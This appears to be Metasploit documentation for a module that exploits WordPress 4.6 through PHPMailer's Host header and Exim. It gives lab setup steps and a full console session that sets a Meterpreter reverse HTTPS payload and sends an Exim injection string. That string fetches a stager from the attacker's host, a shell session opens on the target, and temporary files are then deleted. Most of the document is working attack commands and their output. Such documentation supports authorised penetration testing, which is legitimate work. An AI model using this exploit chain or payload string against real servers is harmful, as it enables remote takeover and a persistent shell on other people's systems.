## Intro

This vuln has some caveats: you need approximately WordPress 4.6 with
Exim for the `sendmail(8)` command.

Thanks to WP's awesome practice of backporting the heck out of all their
patches, we need to use a Git clone and check out the vuln release.

## Setup

This was tested on Ubuntu 15.04. YMMV.

1. got root?
2. `cd /var/www/html`
3. `git clone https://github.com/WordPress/WordPress wordpress-4.6`
4. `chown -R www-data:www-data wordpress-4.6`
5. `cd wordpress-4.6`
6. `git checkout 4.6`
7. Set up a MySQL database for WordPress
8. Install as normal

## Options

**VERBOSE**

If you'd like to see what requests are being sent, set this to `true`.
You should see the Exim prestager commands being sent to the target.

## Usage

Please set the payload options. Some sane defaults are set, but you'll
want to be as specific as possible.

```
msf > use exploit/unix/webapp/wp_phpmailer_host_header 
msf exploit(wp_phpmailer_host_header) > set rhost 192.168.33.152
rhost => 192.168.33.152
msf exploit(wp_phpmailer_host_header) > set targeturi /wordpress-4.6
targeturi => /wordpress-4.6
msf exploit(wp_phpmailer_host_header) > set payload linux/x64/meterpreter_reverse_https
payload => linux/x64/meterpreter_reverse_https
msf exploit(wp_phpmailer_host_header) > set lhost 192.168.33.1
lhost => 192.168.33.1
msf exploit(wp_phpmailer_host_header) > set verbose true
verbose => true
msf exploit(wp_phpmailer_host_header) > run

[*] Started HTTPS reverse handler on https://192.168.33.1:8443
[*] WordPress 4.7 installed at http://192.168.33.152/wordpress-4.6
[*] Generating wget command stager
[*] Using URL: http://0.0.0.0:8080/gzayjqwr
[*] Local IP: http://192.168.1.7:8080/gzayjqwr
[*] Generating and sending Exim prestager
[*] Sending /bin/sh -c ${reduce{get /gzayjqwr http/1.0}{${run{/bin/echo}}}{${extract{-1}{$value}{${readsocket{inet:192.168.33.1:8080}{$item$value$value}}}}}}
[*] https://192.168.33.1:8443 handling request from 192.168.33.152; (UUID: bwm9z08k) Redirecting stageless connection from /Dbyg6-yOlTQo9i70ceSG0wDDy1JAZjOS5ToQyoXw4zXBnF with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://192.168.33.1:8443 handling request from 192.168.33.152; (UUID: bwm9z08k) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (192.168.33.1:8443 -> 192.168.33.152:35138) at 2017-05-10 01:07:35 -0500
[*] Sending /bin/rm -f /tmp/ovcixpnf
[*] Server stopped.

meterpreter > 
```
